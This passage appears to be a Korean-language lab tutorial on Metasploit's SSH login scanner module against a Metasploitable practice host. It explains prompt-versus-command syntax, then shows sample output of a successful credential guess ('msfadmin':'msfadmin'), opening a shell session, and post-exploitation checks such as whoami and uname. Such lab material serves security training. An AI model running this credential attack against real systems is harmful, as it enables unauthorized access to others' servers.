02. 명령어 구문(Syntax) 및 프롬프트 분리

메타스플로잇 프롬프트 문자열인 msf auxiliary(scanner/ssh/ssh_login) > 은 입력해야 할 명령어가 아닙니다. 이는 사용자의 현재 위치를 알려주는 Indicator (지표)일 뿐입니다.

BAD: Prompt Overlap
msf6... > auxiliary(scanner/ssh/ssh_login) > set RHOSTS...

프롬프트를 명령어와 함께 복사하면 Unknown Command 에러가 발생합니다.

GOOD: Clean Input
msf6... > set RHOSTS 192.168.10.13

오직 set, run, use와 같은 행위(Verb) 명령어로 시작하십시오.

03. 공격 성공 결과 및 세션 상호작용 (Result Example)

공격 엔진 실행 결과 (Attack Output)

공격이 성공하면 시스템은 인증된 계정 정보를 출력하고 백그라운드에 Session (세션, 상호작용 연결)을 생성합니다.

# 공격 엔진 가동 후 출력되는 성공 메시지
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 192.168.10.13:22 - Starting SSH login scanner...
[*] 192.168.10.13:22 - Attempting 'root':'password'
[+] 192.168.10.13:22 - Success: 'msfadmin':'msfadmin' (Session 1 Opened)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

세션 제어 (Session Interaction)

열려있는 세션을 확인하고, 해당 세션 내부로 진입하여 Post-Exploitation (침투 후 단계) 명령을 수행합니다.

# 활성화된 세션 리스트 확인
msf6 > sessions
Id Type Information Connection
-- ---- ----------- ----------
1 shell linux 192.168.1.5:4444 -> 192.168.10.13:22
# 세션 1번으로 진입 (Interaction)
msf6 > sessions -i 1
[*] Starting interaction with 1...

시스템 장악 증적 (Proof of Access)

진입한 세션에서 타겟 서버의 정보를 직접 확인하여 침투 성공을 증명합니다.

# 현재 로그인된 사용자 확인 (Who am I)
msfadmin@metasploitable:~$ whoami
msfadmin
# 커널 버전 및 시스템 정보 확인 (Kernel Info)
msfadmin@metasploitable:~$ uname -a
Linux metasploitable 2.6.24-16-server #1 SMP... i686 GNU/Linux
